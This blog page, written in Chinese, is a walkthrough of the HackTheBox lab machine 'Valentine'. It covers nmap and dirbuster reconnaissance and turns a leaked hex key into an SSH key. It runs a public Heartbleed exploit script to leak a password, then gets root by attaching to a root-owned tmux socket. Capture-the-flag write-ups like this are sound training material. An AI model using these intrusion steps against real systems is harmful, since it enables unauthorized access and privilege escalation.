---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "Valentine"
linktitle: "Valentine"
date: 2022-05-13T16:06:40+08:00
type: book
summary: ""
test: 
---


nmap

```python
sudo nmap -T4 -Pn -sV 10.10.10.79
```

![](image/image_NsGV6cgvjb.png)

访问80，图片给的提示应该是心脏出血漏洞 [heartbleed ](https://zh.m.wikipedia.org/zh-hans/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E "heartbleed ")

![](image/image_tss7pXDmIc.png)

dirbuster扫描web路径

![](image/image_bv47XCHRCw.png)

```text
http://10.10.10.79/dev/
```

![](image/image_G3_LldCdHm.png)

hype\_key

![](image/image_IgC8c1OYv5.png)

```纯文本
xxd -r -p hype_key>id_rsa
```

![](image/image_7-qQtUPX8s.png)

发现是ssh登录需要的密钥文件，hype应该是用户名，尝试登录，发现需要密码

![](image/image_2z0OBFl_i_.png)

&#x20;[heartbleed ](https://zh.m.wikipedia.org/zh-hans/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E "heartbleed ")漏洞利用

```bash
#查找kali上的脚本

searchsploit heartbleed 

#复制到当前目录
searchsploit -m 32745.py

```

![](image/image_ky3LX1QALh.png)

```bash
python2 32745.py -h

python2 32745.py 10.10.10.79

```

![](image/image_uINzUaKvA7.png)

得到

```bash
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==


#base64解码，这个应该就是密码

echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d

heartbleedbelievethehype


```

登录

```bash
ssh -i id_rsa hype@10.10.10.79
```

![](image/image_YKN89427OB.png)

提示id\_rsa权限太大，修改一下密钥文件权限，重新登录

```bash
chmod 500 id_rsa
```

登录成功

![](image/image_a1zeqqxiSI.png)

提权，

`sudo -l`需要密码

查看进程信息

```bash
ps -aux |grep root
```

![](image/image_b2SGspIAhr.png)

发现root进程 `/usr/bin/tmux -S /.devs/dev_sess`

`tmux`就是一个终端复用器，简单来说就是个终端

直接执行`tmux -S /.devs/dev_sess`，即可获得root shell

![](image/image_M8OaFxmJNK.png)
